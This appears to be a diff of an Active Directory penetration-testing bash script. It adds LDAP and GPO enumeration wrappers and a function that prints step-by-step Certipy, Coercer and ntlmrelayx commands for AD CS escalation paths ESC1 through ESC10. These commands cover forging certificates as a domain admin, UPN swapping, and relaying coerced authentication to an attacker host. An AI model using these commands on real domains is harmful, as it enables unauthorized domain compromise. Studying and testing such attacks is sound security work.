-            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
-            echo -e "${CYAN}1. Start the relay server:${NC}"
-            echo -e "${certipy} relay -target http://${dc_ip}"
-            echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
-            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
-        done
-    fi
-
-    esc9_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC9" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
-    if [[ ! -z $esc9_vuln ]]; then
-        echo -e "${GREEN}[+] ESC9 vulnerability potentially found! Follow steps below for exploitation:${NC}"
-        for vulntemp in $esc9_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
-            echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
-            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip}"
-            echo -e "${CYAN}2. Change userPrincipalName of second_user to domain_admin:${NC}"
-            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
-            echo -e "${CYAN}3. Request vulnerable certificate as second_user:${NC}"
-            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -target PKI_Server -ca PKI_CA -template ${vulntemp} -dc-ip ${dc_ip}"
-            echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
-            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}"
-            echo -e "${CYAN}5. Authenticate using pfx of domain_admin:${NC}"
-            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
-        done
-    fi
-
-    esc10_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC10") | ."CA Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
-    if [[ ! -z $esc10_vuln ]]; then
-        echo -e "${GREEN}[+] ESC10 vulnerability potentially found! Follow steps below for exploitation:${NC}"
-        for vulntemp in $esc10_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
-            echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
-            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip}"
-            echo -e "${CYAN}2. Change userPrincipalName of user2 to domain_admin or DC:${NC}"
-            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
-            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn ${dc_NETBIOS}\\\$@${dc_domain} -dc-ip ${dc_ip}"
-            echo -e "${CYAN}3. Request certificate permitting client authentication as second_user:${NC}"
-            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca $vulntemp -template User -dc-ip ${dc_ip}"
-            echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
-            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}"
-            echo -e "${CYAN}5. Authenticate using pfx of domain_admin or DC:${NC}"
-            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
-            echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -dc-ip ${dc_ip}"g
-        done
-    fi
-
-    esc11_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC11") | ."CA Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
-    if [[ ! -z $esc11_vuln ]]; then
-        echo -e "${GREEN}[+] ESC11 vulnerability potentially found! Follow steps below for exploitation:${NC}"
-        for vulntemp in $esc11_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
-            echo -e "${CYAN}1. Start the relay server (relay to the Certificate Authority and request certificate via ICPR):${NC}"
-            echo -e "ntlmrelayx.py -t rpc://PKI_Server -rpc-mode ICPR -icpr-ca-name $vulntemp -smb2support"
-            echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
-            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
-        done
-    fi
-}
-
 silenthound_enum () {
     if [ ! -f "${silenthound}" ]; then
         echo -e "${RED}[-] Please verify the location of silenthound${NC}"
     else
+        mkdir -p ${output_dir}/DomainRecon/SilentHound
         echo -e "${BLUE}[*] SilentHound Enumeration${NC}"
         if [ -n "$(ls -A ${output_dir}/DomainRecon/SilentHound/ 2>/dev/null | grep -v 'silenthound_output')" ] ; then
             echo -e "${YELLOW}[i] SilentHound results found, skipping... ${NC}"
@@ -1173,6 +955,7 @@ ldeep_enum () {
     if [ ! -f "${ldeep}" ]; then
         echo -e "${RED}[-] Please verify the location of ldeep${NC}"
     else
+        mkdir -p ${output_dir}/DomainRecon/ldeepDump
         echo -e "${BLUE}[*] ldeep Enumeration${NC}"
         if [ -n "$(ls -A ${output_dir}/DomainRecon/ldeepDump/ | grep -v 'ldeep_output' 2>/dev/null)" ] ; then
             echo -e "${YELLOW}[i] ldeep results found, skipping... ${NC}"
@@ -1196,24 +979,25 @@ windapsearch_enum () {
     if [ ! -f "${windapsearch}" ]; then
         echo -e "${RED}[-] Please verify the location of windapsearch${NC}"
     else
+        mkdir -p ${output_dir}/DomainRecon/windapsearch
         echo -e "${BLUE}[*] windapsearch Enumeration${NC}"
         if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
             echo -e "${PURPLE}[-] windapsearch does not support kerberos authentication${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--secure"; else ldaps_param=""; fi
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m users --full" > ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m computers --full" > ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m groups --full" > ${output_dir}/DomainRecon/windapsearch_groups_${dc_domain}.txt
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m privileged-users --full" > ${output_dir}/DomainRecon/windapsearch_privusers_${dc_domain}.txt
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m users --full" > ${output_dir}/DomainRecon/windapsearch/windapsearch_users_${dc_domain}.txt
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m computers --full" > ${output_dir}/DomainRecon/windapsearch/windapsearch_servers_${dc_domain}.txt
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m groups --full" > ${output_dir}/DomainRecon/windapsearch/windapsearch_groups_${dc_domain}.txt
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m privileged-users --full" > ${output_dir}/DomainRecon/windapsearch/windapsearch_privusers_${dc_domain}.txt
             run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))' --attrs dNSHostName | grep dNSHostName | cut -d ' ' -f 2 | sort -u" > ${output_dir}/DomainRecon/Servers/sql_list_windap_${dc_domain}.txt
             #Parsing user and computer lists
-            /bin/cat ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt 2>/dev/null | grep -a "sAMAccountName:" | sed "s/sAMAccountName: //g" | sort -u > ${output_dir}/DomainRecon/Users/users_list_windap_${dc_domain}.txt 2>&1
-            /bin/cat ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt 2>/dev/null | grep -a "dNSHostName:" | sed "s/dNSHostName: //g" | sort -u > ${output_dir}/DomainRecon/Servers/servers_list_windap_${dc_domain}.txt 2>&1
-            /bin/cat ${output_dir}/DomainRecon/windapsearch_groups_${dc_domain}.txt 2>/dev/null | grep -a "cn:" | sed "s/cn: //g" | sort -u > ${output_dir}/DomainRecon/groups_list_windap_${dc_domain}.txt 2>&1
-            grep -iha "pass\|pwd" ${output_dir}/DomainRecon/windapsearch_*_${dc_domain}.txt 2>/dev/null | grep -av "badPasswordTime\|badPwdCount\|badPasswordTime\|pwdLastSet\|have their passwords replicated\|RODC Password Replication Group\|msExch"  > ${output_dir}/DomainRecon/windapsearch_pwdfields_${dc_domain}.txt
-            if [ -s "${output_dir}/DomainRecon/windapsearch_pwdfields_${dc_domain}.txt" ] ; then
+            /bin/cat ${output_dir}/DomainRecon/windapsearch/windapsearch_users_${dc_domain}.txt 2>/dev/null | grep -a "sAMAccountName:" | sed "s/sAMAccountName: //g" | sort -u > ${output_dir}/DomainRecon/Users/users_list_windap_${dc_domain}.txt 2>&1
+            /bin/cat ${output_dir}/DomainRecon/windapsearch/windapsearch_servers_${dc_domain}.txt 2>/dev/null | grep -a "dNSHostName:" | sed "s/dNSHostName: //g" | sort -u > ${output_dir}/DomainRecon/Servers/servers_list_windap_${dc_domain}.txt 2>&1
+            /bin/cat ${output_dir}/DomainRecon/windapsearch/windapsearch_groups_${dc_domain}.txt 2>/dev/null | grep -a "cn:" | sed "s/cn: //g" | sort -u > ${output_dir}/DomainRecon/windapsearch/groups_list_windap_${dc_domain}.txt 2>&1
+            grep -iha "pass\|pwd" ${output_dir}/DomainRecon/windapsearch/windapsearch_*_${dc_domain}.txt 2>/dev/null | grep -av "badPasswordTime\|badPwdCount\|badPasswordTime\|pwdLastSet\|have their passwords replicated\|RODC Password Replication Group\|msExch"  > ${output_dir}/DomainRecon/windapsearch/windapsearch_pwdfields_${dc_domain}.txt
+            if [ -s "${output_dir}/DomainRecon/windapsearch/windapsearch_pwdfields_${dc_domain}.txt" ] ; then
                 echo -e "${GREEN}[+] Printing passwords found in LDAP fields...${NC}"
-                /bin/cat ${output_dir}/DomainRecon/windapsearch_pwdfields_${dc_domain}.txt 2>/dev/null
+                /bin/cat ${output_dir}/DomainRecon/windapsearch/windapsearch_pwdfields_${dc_domain}.txt 2>/dev/null
             fi
             echo -e "${GREEN}[+] windapsearch enumeration of users, servers, groups complete.${NC}"
             parse_users
@@ -1276,6 +1060,7 @@ ldapper_enum (){
         if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
             echo -e "${PURPLE}[-] ldapper requires credentials and does not support kerberos authentication${NC}"
         else
+            mkdir -p ${output_dir}/DomainRecon/LDAPPER
             echo -e "${BLUE}[*] Enumeration of LDAP using ldapper${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-n 1"; else ldaps_param="-n 2"; fi
             echo -e "${CYAN}[*] Get all users${NC}"
@@ -1319,6 +1104,7 @@ adalanche_enum () {
     if [ ! -f "${adalanche}" ] ; then
         echo -e "${RED}[-] Please verify the installation of Adalanche${NC}"
     else
+        mkdir -p ${output_dir}/DomainRecon/Adalanche
         echo -e "${BLUE}[*] Adalanche Enumeration${NC}"
         if [ -n "$(ls -A ${output_dir}/DomainRecon/Adalanche/data 2>/dev/null)" ] ; then
             echo -e "${YELLOW}[i] Adalanche results found, skipping... ${NC}"
@@ -1337,7 +1123,348 @@ adalanche_enum () {
     echo -e ""
 }
 
-###### Kerberos attacks
+GPOwned_enum () {
+    if [ ! -f "${GPOwned}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of GPOwned${NC}"
+    else
+        echo -e "${BLUE}[*] GPO Enumeration using GPOwned${NC}"
+        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
+        echo -e "${PURPLE}[-] GPOwned requires credentials and does not support kerberos authentication${NC}"
+        else
+            run_command "${GPOwned} ${argument_GPOwned} -dc-ip ${dc_ip} -listgpo -gpcuser" | tee ${output_dir}/DomainRecon/GPOwned_output_${dc_domain}.txt
+            run_command "${GPOwned} ${argument_GPOwned} -dc-ip ${dc_ip} -listgpo -gpcmachine" | tee -a ${output_dir}/DomainRecon/GPOwned_output_${dc_domain}.txt
+        fi
+    fi
+    echo -e ""
+}
+
+ldap_console () {
+    if [ ! -f "${FindUncommonShares}" ]; then
+        echo -e "${RED}[-] Please verify the installation of ldapconsole${NC}"
+    else
+        echo -e "${BLUE}[*] Launching ldapconsole${NC}"
+        if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
+        if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-debug"; else verbose_p0dalirius=""; fi
+        run_command "${ldapconsole} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1 | tee -a ${output_dir}/DomainRecon/ldapconsole_output_${dc_domain}.txt
+    fi
+    echo -e ""
+}
+
+ldap_monitor () {
+    if [ ! -f "${pyLDAPmonitor}" ]; then
+        echo -e "${RED}[-] Please verify the installation of pyLDAPmonitor${NC}"
+    else
+        echo -e "${BLUE}[*] Launching pyLDAPmonitor${NC}"
+        if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
+        if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
+        run_command "${pyLDAPmonitor} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1
+    fi
+    echo -e ""
+}
+
+aced_console (){
+    if [ ! -f "${aced}" ]; then
+        echo -e "${RED}[-] Please verify the installation of aced${NC}"
+    else
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] aced requires credentials${NC}"
+        else
+            echo -e "${BLUE}[*] Launching aced${NC}"
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
+            run_command "$(which python) ${aced} ${argument_aced}@${dc_FQDN} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a ${output_dir}/DomainRecon/aced_output_${dc_domain}.txt
+        fi
+    fi
+    echo -e ""
+}
+
+ldapper_console (){
+    if [ ! -f "${ldapper}" ]; then
+        echo -e "${RED}[-] Please verify the installation of ldapper${NC}"
+    else
+        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] ldapper requires credentials and does not support kerberos authentication${NC}"
+        else
+            mkdir -p ${output_dir}/DomainRecon/LDAPPER
+            echo -e "${BLUE}[*] Running ldapper with custom LDAP search string${NC}"
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-n 1"; else ldaps_param="-n 2"; fi
+            echo -e "${CYAN}[*] Please choose an option or provide a custom LDAP search string ${NC}"
+            echo -e "1.1) Get specific user (You will be prompted for the username)"
+            echo -e "2.1) Get specific group (You will be prompted for the group name)"
+            echo -e "4.1) Get specific computer (You will be prompted for the computer name)"
+            echo -e "9.1) Search for specific User SPN (You will be prompted for the User Principle Name)"
+            echo -e "10.1) Search for specific Workstation LAPS Password (You will be prompted for the Workstation Name)"
+            echo -e "*) Run custom Query (e.g. (&(objectcategory=user)(serviceprincipalname=*))"
+            echo -e "back) Go back"
+
+            read -p "> " custom_option </dev/tty
+            if [[ ! ${custom_option} == "back" ]]; then
+                run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -s ${custom_option} | tee -a ${output_dir}/DomainRecon/LDAPPER/ldapper_console_output_${dc_domain}.txt
+            else
+                ad_menu
+            fi
+            ldapper_console
+        fi
+    fi
+    echo -e ""
+}
+
+###### adcs_enum: ADCS Enumeration
+ne_adcs_enum (){
+    if [ ! -f "${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt" ]; then
+        echo -e "${BLUE}[*] ADCS Enumeration${NC}"
+        if [ "${ldaps_bool}" == true ]; then ldaps_param="--port 636"; else ldaps_param=""; fi
+        run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M adcs --kdcHost ${dc_FQDN} --log ${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt" 2>&1
+    else
+        echo -e "${YELLOW}[i] ADCS info found, skipping...${NC}"
+    fi
+    pki_servers=$(/bin/cat ${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found PKI Enrollment Server" | cut -d ":" -f 4 | cut -d " " -f 2 | awk '!x[$0]++')
+    pki_cas=$(/bin/cat ${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found CN" | cut -d ":" -f 4 | cut -d " " -f 2 | awk '!x[$0]++')
+}
+
+certi_py_enum () {
+    if [[ ! -f "${certi_py}" ]] ; then
+        echo -e "${RED}[-] Please verify the installation of certi.py${NC}"
+    else
+        echo -e "${BLUE}[*] certi.py Enumeration${NC}"
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] certi.py requires credentials${NC}"
+        else
+            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class ca" 2>&1 | tee ${output_dir}/ADCS/certi.py_CA_output_${dc_domain}.txt
+            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class service" 2>&1 | tee ${output_dir}/ADCS/certi.py_CAServices_output_${dc_domain}.txt
+            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --vuln --enabled" 2>&1 | tee ${output_dir}/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt
+        fi
+    fi
+    echo -e ""
+}
+
+certipy_enum () {
+    if [[ ! -f "${certipy}" ]] ; then
+        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
+    else
+        echo -e "${BLUE}[*] Certipy Enumeration${NC}"
+        if [ -n "$(ls -A ${output_dir}/ADCS/*_Certipy* 2>/dev/null)" ] ; then
+            echo -e "${YELLOW}[i] Certipy results found, skipping... ${NC}"
+        else
+            if [ "${nullsess_bool}" == true ] ; then
+                echo -e "${PURPLE}[-] certipy requires credentials${NC}"
+            else
+                current_dir=$(pwd)
+                cd ${output_dir}/ADCS
+                if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
+                run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -stdout -old-bloodhound" 2>&1 | tee ${output_dir}/ADCS/certipy_output_${dc_domain}.txt
+                run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 >> ${output_dir}/ADCS/certipy_vulnerable_output_${dc_domain}.txt
+                cd ${current_dir}
+            fi
+        fi
+    fi
+    adcs_vuln_parse
+    echo -e ""
+}
+
+adcs_vuln_parse (){
+    ne_adcs_enum
+    esc1_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC1" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
+    if [[ ! -z $esc1_vuln ]]; then
+        echo -e "${GREEN}[+] Templates vulnerable to ESC1 potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc1_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
+            echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
+            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
+            echo -e "${CYAN}2. Authenticate using pfx of domain_admin or DC:${NC}"
+            echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip}"
+        done
+    fi
+
+    esc2_3_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select ((."[!] Vulnerabilities"."ESC2" or ."[!] Vulnerabilities"."ESC3") and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
+    if [[ ! -z $esc2_3_vuln ]]; then
+        echo -e "${GREEN}[+] Templates vulnerable to ESC2 or ESC3 potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc2_3_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
+            echo -e "${CYAN}1. Request a certificate based on the vulnerable template:${NC}"
+            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -dc-ip ${dc_ip}"
+            echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the domain_admin:${NC}"
+            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template User -on-behalf-of $(echo $dc_domain | cut -d "." -f 1)\\domain_admin -pfx ${user}.pfx -dc-ip ${dc_ip}"
+            echo -e "${CYAN}3. Authenticate using pfx of domain_admin:${NC}"
+            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
+        done
+    fi
+
+    esc4_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC4" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
+    if [[ ! -z $esc4_vuln ]]; then
+        echo -e "${GREEN}[+] Templates vulnerable to ESC4 potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc4_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
+            echo -e "${CYAN}1. Make the template vulnerable to ESC1:${NC}"
+            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip}"
+            echo -e "${CYAN}2. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
+            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
+            echo -e "${CYAN}3. Restore configuration of vulnerable template:${NC}"
+            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json"
+            echo -e "${CYAN}4. Authenticate using pfx of domain_admin or DC:${NC}"
+            echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip}"
+        done
+    fi
+
+    esc6_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC6") | ."CA Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
+    if [[ ! -z $esc6_vuln ]]; then
+        echo -e "${GREEN}[+] ESC6 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc6_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
+            echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
+            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target PKI_Server -template User -upn domain_admin@${dc_domain}"
+            echo -e "${CYAN}2. Authenticate using pfx of domain_admin:${NC}"
+            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
+        done
+    fi
+
+    esc7_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC7") | ."CA Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
+    if [[ ! -z $esc7_vuln ]]; then
+        echo -e "${GREEN}[+] ESC7 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc7_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
+            echo -e "${CYAN}1. Add a new officer:${NC}"
+            echo -e "${certipy} ca ${argument_certipy} -ca $vulntemp -add-officer "${user}" -dc-ip ${dc_ip}"
+            echo -e "${CYAN}2. Enable SubCA certificate template:${NC}"
+            echo -e "${certipy} ca ${argument_certipy} --ca $vulntemp -enable-template SubCA -dc-ip ${dc_ip}"
+            echo -e "${CYAN}3. Save the private key and note down the request ID:${NC}"
+            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target PKI_Server -template SubCA -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
+            echo -e "${CYAN}4. Issue a failed request (need ManageCA and ManageCertificates rights for a failed request):${NC}"
+            echo -e "${certipy} ca ${argument_certipy} -ca $vulntemp -issue-request <request_ID> -dc-ip ${dc_ip}"
+            echo -e "${CYAN}5. Retrieve an issued certificate:${NC}"
+            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target PKI_Server -retrieve <request_ID> -dc-ip ${dc_ip}"
+            echo -e "${CYAN}6. Authenticate using pfx of domain_admin:${NC}"
+            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
+        done
+    fi
+
+    esc8_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC8") | ."CA Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
+    if [[ ! -z $esc8_vuln ]]; then
+        echo -e "${GREEN}[+] ESC8 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc8_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
+            echo -e "${CYAN}1. Start the relay server:${NC}"
+            echo -e "${certipy} relay -target http://${dc_ip}"
+            echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
+            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
+        done
+    fi
+
+    esc9_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC9" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
+    if [[ ! -z $esc9_vuln ]]; then
+        echo -e "${GREEN}[+] ESC9 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc9_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
+            echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
+            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip}"
+            echo -e "${CYAN}2. Change userPrincipalName of second_user to domain_admin:${NC}"
+            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
+            echo -e "${CYAN}3. Request vulnerable certificate as second_user:${NC}"
+            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -target PKI_Server -ca PKI_CA -template ${vulntemp} -dc-ip ${dc_ip}"
+            echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
+            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}"
+            echo -e "${CYAN}5. Authenticate using pfx of domain_admin:${NC}"
+            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
+        done
+    fi
+
+    esc10_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC10") | ."CA Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
+    if [[ ! -z $esc10_vuln ]]; then
+        echo -e "${GREEN}[+] ESC10 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc10_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
+            echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
+            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip}"
+            echo -e "${CYAN}2. Change userPrincipalName of user2 to domain_admin or DC:${NC}"
+            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
+            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn ${dc_NETBIOS}\\\$@${dc_domain} -dc-ip ${dc_ip}"
+            echo -e "${CYAN}3. Request certificate permitting client authentication as second_user:${NC}"
+            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca $vulntemp -template User -dc-ip ${dc_ip}"
+            echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
+            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}"
+            echo -e "${CYAN}5. Authenticate using pfx of domain_admin or DC:${NC}"
+            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
+            echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -dc-ip ${dc_ip}"g
+        done
+    fi
+
